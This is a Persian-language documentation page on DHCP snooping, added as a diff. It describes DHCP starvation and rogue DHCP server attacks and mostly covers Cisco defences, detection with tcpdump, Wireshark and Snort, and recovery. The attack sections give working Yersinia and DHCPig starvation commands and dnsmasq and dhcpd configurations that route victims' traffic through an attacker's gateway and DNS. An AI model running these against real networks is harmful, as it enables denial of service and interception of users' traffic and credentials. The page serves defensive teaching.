@@ -1,0 +1,515 @@
+---
+title: DHCP Snooping
+description: حملات DHCP و مکانیزم‌های حفاظتی snooping
+---
+
+## مروری بر DHCP
+
+**DHCP (Dynamic Host Configuration Protocol)** به طور خودکار آدرس‌های IP و پیکربندی شبکه را به دستگاه‌ها اختصاص می‌دهد. بر روی پورت‌های UDP 67 (سرور) و 68 (کلاینت) کار می‌کند.
+
+### فرآیند DHCP (DORA)
+
+1. **Discover**: کلاینت برای یافتن سرور DHCP پخش می‌کند
+2. **Offer**: سرور پیکربندی IP ارائه می‌دهد
+3. **Request**: کلاینت پیکربندی ارائه شده را درخواست می‌کند
+4. **Acknowledgment**: سرور اختصاص را تایید می‌کند
+
+```
+Client (0.0.0.0)  →  DHCP Discover  →  Broadcast
+Server             →  DHCP Offer     →  Client
+Client             →  DHCP Request   →  Broadcast
+Server             →  DHCP ACK       →  Client (IP اختصاص یافته)
+```
+
+## حملات DHCP
+
+### خستگی DHCP (DHCP Starvation)
+
+مهاجم استخر آدرس IP سرور DHCP را با درخواست همه آدرس‌های موجود تمام می‌کند.
+
+#### فرآیند حمله
+```
+1. مهاجم DHCP Discover با آدرس‌های MAC جعلی ارسال می‌کند
+2. سرور آدرس‌های IP را به کلاینت‌های جعلی ارائه می‌دهد
+3. مهاجم همه پیشنهادات را می‌پذیرد (DHCP Request)
+4. سرور تایید و IPها را اختصاص می‌دهد
+5. استخر DHCP تمام می‌شود
+6. کلاینت‌های قانونی نمی‌توانند آدرس IP دریافت کنند
+```
+
+#### ابزارها: Yersinia
+
+```bash
+# نصب Yersinia
+sudo apt install yersinia
+
+# حالت GUI
+sudo yersinia -G
+# انتخاب پروتکل DHCP
+# انتخاب حمله "DHCP Starvation"
+
+# حالت CLI
+sudo yersinia dhcp -attack 1
+
+# حمله Gobbler (تمام کردن DHCP)
+sudo yersinia dhcp -attack 1 -interface eth0
+```
+
+#### ابزارها: DHCPig
+
+```bash
+# نصب
+git clone https://github.com/kamorin/DHCPig.git
+cd DHCPig
+chmod +x pig.py
+
+# اجرای حمله
+sudo ./pig.py eth0
+
+# گزینه‌های پیشرفته
+sudo ./pig.py eth0 --timeout 10 --count 100
+```
+
+### سرور DHCP جعلی (Rogue)
+
+مهاجم یک سرور DHCP جعلی راه‌اندازی می‌کند تا پیکربندی شبکه مخرب ارائه دهد.
+
+#### سناریوی حمله
+```
+1. مهاجم سرور DHCP جعلی مستقر می‌کند
+2. کلاینت DHCP Discover پخش می‌کند
+3. هم سرورهای قانونی و هم جعلی پاسخ می‌دهند
+4. کلاینت اولین پاسخ را می‌پذیرد (اغلب جعلی)
+5. سرور جعلی ارائه می‌دهد:
+   - آدرس IP معتبر
+   - مهاجم به عنوان gateway پیش‌فرض
+   - مهاجم به عنوان سرور DNS
+6. همه ترافیک کلاینت از طریق مهاجم مسیریابی می‌شود (MITM)
+```
+
+#### راه‌اندازی سرور DHCP جعلی
+
+**استفاده از dnsmasq**
+```bash
+# نصب
+sudo apt install dnsmasq
+
+# پیکربندی (/etc/dnsmasq.conf)
+interface=eth0
+dhcp-range=192.168.1.100,192.168.1.200,12h
+dhcp-option=3,192.168.1.10    # Gateway (مهاجم)
+dhcp-option=6,192.168.1.10    # DNS (مهاجم)
+dhcp-authoritative
+
+# شروع سرویس
+sudo systemctl start dnsmasq
+```
+
+**استفاده از dhcpd (سرور ISC DHCP)**
+```bash
+# نصب
+sudo apt install isc-dhcp-server
+
+# پیکربندی (/etc/dhcp/dhcpd.conf)
+subnet 192.168.1.0 netmask 255.255.255.0 {
+    range 192.168.1.100 192.168.1.200;
+    option routers 192.168.1.10;          # مهاجم
+    option domain-name-servers 192.168.1.10;  # مهاجم
+    default-lease-time 600;
+    max-lease-time 7200;
+}
+
+# مشخص کردن رابط (/etc/default/isc-dhcp-server)
+INTERFACESv4="eth0"
+
+# شروع سرویس
+sudo systemctl start isc-dhcp-server
+```
+
+#### تاثیر DHCP جعلی
+- **Man-in-the-Middle**: همه ترافیک رهگیری می‌شود
+- **جعل DNS**: هدایت به سایت‌های مخرب
+- **برداشت اعتبارنامه**: ضبط اعتبارنامه‌های ورود
+- **جداسازی شبکه**: پیکربندی زیرشبکه اشتباه
+- **اختلال سرویس**: gateway نامعتبر باعث از دست دادن اتصال می‌شود
+
+### فرار از DHCP Snooping
+
+مهاجمان ممکن است سعی کنند از حفاظت DHCP snooping عبور کنند.
+
+## DHCP Snooping
+
+**DHCP Snooping** ویژگی امنیتی است که به عنوان فایروال بین هاست‌های غیرقابل اعتماد و سرورهای DHCP عمل می‌کند.
+
+### نحوه کار
+
+1. **ساخت پایگاه داده binding**: نگاشت IP، MAC، پورت، VLAN
+2. **اعتبارسنجی پیام‌های DHCP**: بررسی در برابر جدول binding
+3. **محدودسازی نرخ**: جلوگیری از سیل
+4. **حذف بسته‌های مخرب**: مسدود کردن سرورهای جعلی
+
+### پورت‌های قابل اعتماد در برابر غیرقابل اعتماد
+
+- **پورت‌های قابل اعتماد**: اجازه پیام‌های سرور DHCP (Offer، ACK)
+  - پورت‌های uplink به سرورهای DHCP قانونی
+  - معمولاً در پورت‌های trunk پیکربندی می‌شود
+
+- **پورت‌های غیرقابل اعتماد**: فقط اجازه پیام‌های کلاینت (Discover، Request)
+  - پورت‌های دسترسی متصل به دستگاه‌های نهایی
+  - مسدود کردن پیام‌های سرور از این پورت‌ها
+
+### پیکربندی (Cisco)
+
+#### DHCP Snooping پایه
+```cisco
+# فعال کردن DHCP snooping به صورت سراسری
+ip dhcp snooping
+
+# فعال کردن برای VLANهای خاص
+ip dhcp snooping vlan 10
+ip dhcp snooping vlan 20,30,40-50
+
+# پیکربندی پورت‌های قابل اعتماد (uplink به سرور DHCP)
+interface GigabitEthernet0/1
+  description Uplink to DHCP Server
+  ip dhcp snooping trust
+
+# پورت‌های غیرقابل اعتماد (پیش‌فرض - نیازی به پیکربندی نیست)
+interface range FastEthernet0/1-24
+  description Access Ports
+  # غیرقابل اعتماد به صورت پیش‌فرض
+```
+
+#### محدودسازی نرخ
+```cisco
+# محدود کردن بسته‌های DHCP در ثانیه (جلوگیری از starvation)
+interface range FastEthernet0/1-24
+  ip dhcp snooping limit rate 10
+
+# حد بالاتر برای APهای بی‌سیم
+interface FastEthernet0/10
+  ip dhcp snooping limit rate 50
+```
+
+#### گزینه اطلاعات 82
+```cisco
+# درج گزینه 82 (اطلاعات relay)
+ip dhcp snooping information option
+
+# اجازه گزینه 82 از منابع غیرقابل اعتماد (در صورت نیاز)
+ip dhcp snooping information option allow-untrusted
+
+# فرمت برای گزینه 82
+ip dhcp snooping information option format remote-id hostname
+```
+
+#### تایید پیکربندی
+```cisco
+# نمایش وضعیت DHCP snooping
+show ip dhcp snooping
+
+# نمایش پایگاه داده binding
+show ip dhcp snooping binding
+
+# نمایش آمار
+show ip dhcp snooping statistics
+
+# نمایش رابط‌های قابل اعتماد
+show ip dhcp snooping trust
+```
+
+### پایگاه داده Binding
+
+پایگاه داده binding ذخیره می‌کند:
+- **آدرس MAC**: آدرس سخت‌افزاری کلاینت
+- **آدرس IP**: IP اختصاص یافته
+- **VLAN**: VLAN کلاینت
+- **Interface**: پورت سوئیچ
+- **زمان اجاره**: زمان انقضا
+
+#### مثال جدول Binding
+```
+MacAddress         IpAddress    Lease(sec) Type      VLAN Interface
+------------------ ------------ ---------- --------- ---- ----------
+00:11:22:33:44:55  192.168.1.10 86400      dhcp-snooping 10   Fa0/5
+AA:BB:CC:DD:EE:FF  192.168.1.11 86400      dhcp-snooping 10   Fa0/8
+```
+
+#### ذخیره پایگاه داده Binding
+```cisco
+# ذخیره در فایل (راه‌اندازی مجدد را تحمل می‌کند)
+ip dhcp snooping database flash:dhcp-snooping.db
+
+# ذخیره در سرور TFTP
+ip dhcp snooping database tftp://192.168.1.100/dhcp-snooping.db
+
+# تنظیم تاخیر نوشتن (ثانیه)
+ip dhcp snooping database write-delay 300
+```
+
+### یکپارچگی با DAI
+
+پایگاه داده binding DHCP Snooping توسط **Dynamic ARP Inspection** استفاده می‌شود.
+
+```cisco
+# فعال کردن DHCP snooping (پیش‌نیاز)
+ip dhcp snooping
+ip dhcp snooping vlan 10
+
+# فعال کردن Dynamic ARP Inspection
+ip arp inspection vlan 10
+
+# اعتماد به پورت‌های uplink برای هر دو
+interface GigabitEthernet0/1
+  ip dhcp snooping trust
+  ip arp inspection trust
+```
+
+## روش‌های تشخیص
+
+### نظارت بر ترافیک DHCP
+
+#### استفاده از tcpdump
+```bash
+# ضبط ترافیک DHCP
+sudo tcpdump -i eth0 -n port 67 or port 68
+
+# خروجی جزئی
+sudo tcpdump -i eth0 -vv -n port 67 or port 68
+
+# ذخیره در فایل
+sudo tcpdump -i eth0 -w dhcp.pcap port 67 or port 68
+```
+
+#### استفاده از Wireshark
+```
+# فیلتر نمایش
+bootp
+
+# فیلتر DHCP Discover
+bootp.option.dhcp == 1
+
+# فیلتر DHCP Offer
+bootp.option.dhcp == 2
+
+# فیلتر DHCP Request
+bootp.option.dhcp == 3
+
+# فیلتر DHCP ACK
+bootp.option.dhcp == 5
+```
+
+### نشانگرهای حمله
+
+#### خستگی DHCP
+- چندین DHCP Discover با MACهای مختلف
+- نرخ بالای تراکنش‌های DHCP
+- هشدارهای تمام شدن استخر DHCP
+- کلاینت‌های قانونی در دریافت آدرس شکست می‌خورند
+
+#### سرور DHCP جعلی
+- چندین DHCP Offer برای یک Discover
+- IP ناشناخته پاسخ با DHCP Offer
+- پاسخ‌های DHCP از پورت‌های غیرقابل اعتماد
+- کلاینت‌ها پیکربندی غیرمنتظره دریافت می‌کنند
+
+### نظارت شبکه
+
+#### قوانین Snort
+```snort
+# تشخیص خستگی DHCP
+alert udp any 68 -> any 67 (msg:"DHCP Starvation Attack"; \
+  threshold:type threshold, track by_src, count 50, seconds 60; \
+  sid:1000010;)
+
+# تشخیص سرور DHCP جعلی
+alert udp any 67 -> any 68 (msg:"Rogue DHCP Server Detected"; \
+  content:"|02|"; offset:0; depth:1; \
+  sid:1000011;)
+```
+
+#### ثبت لاگ
+```cisco
+# فعال کردن ثبت لاگ برای DHCP snooping
+logging buffered informational
+logging trap notifications
+
+# ثبت لاگ به سرور syslog
+logging host 192.168.1.100
+
+# مشاهده لاگ‌ها
+show logging | include DHCP
+```
+
+## اقدامات حفاظتی اضافی
+
+### IP Source Guard
+
+جلوگیری از جعل IP با اعتبارسنجی IP مبدأ در برابر binding DHCP.
+
+```cisco
+# فعال کردن IP Source Guard در رابط
+interface FastEthernet0/5
+  ip verify source
+
+# با تایید آدرس MAC
+interface FastEthernet0/5
+  ip verify source port-security
+
+# تایید پیکربندی
+show ip verify source
+```
+
+### Bindingهای ثابت
+
+پیکربندی دستی bindingها برای دستگاه‌های بحرانی.
+
+```cisco
+# اضافه کردن binding ثابت
+ip dhcp snooping binding 0011.2233.4455 vlan 10 192.168.1.50 interface FastEthernet0/10 expiry 86400
+
+# تایید
+show ip dhcp snooping binding
+```
+
+### فیلتر آدرس MAC
+
+فقط اجازه دریافت DHCP به آدرس‌های MAC شناخته شده.
+
+```cisco
+# پیکربندی سرور DHCP با فیلتر MAC
+ip dhcp pool RESTRICTED
+  host 192.168.1.100 hardware-address 0011.2233.4455
+  default-router 192.168.1.1
+  dns-server 8.8.8.8
+```
+
+### بخش‌بندی شبکه
+
+- جداسازی سرورهای DHCP در VLAN مدیریتی
+- استفاده از VLANها برای بخش‌بندی جمعیت‌های کاربر
+- پیاده‌سازی VLANهای خصوصی برای شبکه‌های مهمان
+
+## بازیابی از حمله
+
+### بعد از خستگی DHCP
+
+1. **شناسایی منبع حمله**
+   ```cisco
+   show ip dhcp snooping binding
+   show ip dhcp snooping statistics
+   ```
+
+2. **پاک کردن bindingهای جعلی**
+   ```cisco
+   clear ip dhcp snooping binding
+   # یا ورودی خاص
+   clear ip dhcp snooping binding vlan 10 0011.2233.4455
+   ```
+
+3. **راه‌اندازی مجدد سرویس DHCP** (در سرور)
+   ```bash
+   sudo systemctl restart isc-dhcp-server
+   ```
+
+4. **فعال کردن محدودسازی نرخ**
+   ```cisco
+   interface range FastEthernet0/1-24
+     ip dhcp snooping limit rate 10
+   ```
+
+### بعد از تشخیص DHCP جعلی
+
+1. **مکان‌یابی سرور جعلی**
+   ```cisco
+   show ip dhcp snooping binding
+   # شناسایی پورت غیرقابل اعتماد با پاسخ‌های سرور
+   ```
+
+2. **خاموش کردن پورت مخرب**
+   ```cisco
+   interface FastEthernet0/12
+     shutdown
+   ```
+
+3. **آزاد و تمدید اجاره‌های کلاینت**
+   ```bash
+   # Linux
+   sudo dhclient -r eth0
+   sudo dhclient eth0
+
+   # Windows
+   ipconfig /release
+   ipconfig /renew
+   ```
+
+4. **تایید عملکرد DHCP قانونی**
+   ```cisco
+   show ip dhcp binding
+   show ip dhcp snooping binding
+   ```
+
+## بهترین روش‌ها
+
+1. **فعال کردن DHCP snooping** در همه سوئیچ‌های دسترسی
+2. **پیکربندی پورت‌های قابل اعتماد** فقط برای سرورهای DHCP قانونی
+3. **پیاده‌سازی محدودسازی نرخ** در پورت‌های غیرقابل اعتماد
+4. **ذخیره پایگاه داده binding** در ذخیره‌سازی پایدار
+5. **یکپارچه‌سازی با DAI و IP Source Guard**
+6. **نظارت بر ترافیک DHCP** برای ناهنجاری‌ها
+7. **استفاده از bindingهای ثابت** برای زیرساخت بحرانی
+8. **ممیزی‌های منظم** پیکربندی DHCP snooping
+9. **سرورهای DHCP متمرکز** با افزونگی
+10. **آموزش کاربران** درباره خطرات سرورهای DHCP غیرمجاز
+
+## آزمایش پیکربندی
+
+```bash
+# آزمایش عملکرد DHCP
+# دستگاه کلاینت
+sudo dhclient -r eth0
+sudo dhclient -v eth0
+
+# باید IP معتبر از سرور قانونی دریافت کند
+
+# آزمایش حفاظت (نیاز به محیط آزمایشگاه)
+# تلاش برای اجرای سرور DHCP جعلی
+sudo dnsmasq -d -C /tmp/rogue-dhcp.conf
+# باید توسط DHCP snooping مسدود شود
+
+# تایید لاگ‌های سوئیچ
+# در سوئیچ
+show logging | include DHCP
+```
+
+## پیکربندی پیشرفته
+
+### گزینه 82 Circuit ID
+```cisco
+# پیکربندی گزینه 82 با فرمت سفارشی
+ip dhcp snooping information option format remote-id string MySwitch01
+
+# Circuit ID به ازای رابط
+interface FastEthernet0/5
+  ip dhcp snooping information option format-type circuit-id string "Building-A-Floor-3"
+```
+
+### DHCP Relay با Snooping
+```cisco
+# پیکربندی DHCP relay
+interface Vlan10
+  ip helper-address 192.168.100.10
+
+# فعال کردن snooping در relay
+ip dhcp snooping
+ip dhcp snooping vlan 10
+ip dhcp snooping information option
+```
+
+## منابع
+
+- RFC 2131: Dynamic Host Configuration Protocol
+- RFC 3046: DHCP Relay Agent Information Option
+- راهنمای پیکربندی Cisco DHCP Snooping
+- بهترین روش‌های امنیت DHCP
+- ابزار DHCPig: https://github.com/kamorin/DHCPig
